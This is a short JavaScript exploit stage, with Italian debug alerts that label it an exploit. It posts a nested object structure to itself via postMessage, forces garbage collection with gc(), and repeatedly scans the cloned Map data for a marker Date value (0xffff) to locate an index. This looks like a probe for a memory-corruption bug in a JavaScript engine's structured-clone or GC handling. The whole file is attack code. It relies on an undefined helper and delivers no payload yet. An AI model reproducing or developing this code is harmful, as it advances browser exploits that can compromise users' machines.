export async function main() {
    alert("Inizio exploit");

    const num_elems = 5;  // Numero di elementi per la struttura
    let root = createObjectStructure(num_elems);
    let msg = root;
    let idx = null;
    let attempt = 0;

    alert("Oggetto struttura creata");

    let found = false;
    while (!found) {
        attempt += 1;

        alert(`Tentativo numero: ${attempt}`);
        let data = null;

        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        try {
            postMessage(msg, origin);  // Pubblica il messaggio
        } catch (e) {
            alert("Errore durante postMessage: " + e.message);
            break;
        }

        await prom;  // Aspetta che venga ricevuto il messaggio

        if (!data) {
            alert("Errore: Nessun dato ricevuto");
            break;
        }

        data = data.data;

        if (!data) {
            alert("Errore: Struttura del messaggio vuota");
            break;
        }

        alert("Messaggio ricevuto con successo");

        gc();  // Garbage Collection

        await new Promise(resolve => setTimeout(resolve, 100));  // Pausa per evitare conflitti temporali

        let i;
        try {
            alert("Inizio ricerca dell'indice...");
            for (i = 0; i < num_elems; i++) {
                // Debug dettagliato della struttura
                alert(`Indice ${i}: Struttura data -> ${JSON.stringify([...data.keys()])}`);

                const currentKey = data.keys().next().value;

                if (!currentKey) {
                    alert(`Indice ${i}: Chiave non valida, avanzando...`);
                    continue;
                }

                if (currentKey instanceof Date && currentKey.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }

                alert(`Indice ${i}: Valore corrente non valido, avanzando...`);
                data = data.values().next().value[0];  // Passa al nodo successivo

                if (!data) {
                    alert("Errore: Nodo successivo inesistente");
                    break;
                }
            }
        } catch (e) {
            alert("Errore durante l'elaborazione del messaggio: " + e.message);
            break;
        }

        if (!found) {
            alert("Indice non trovato, riprovando...");
        }
    }

    if (found) {
        alert(`Exploit completato con successo, indice trovato: ${idx}`);
    } else {
        alert("Exploit fallito: Indice non trovato.");
    }
}
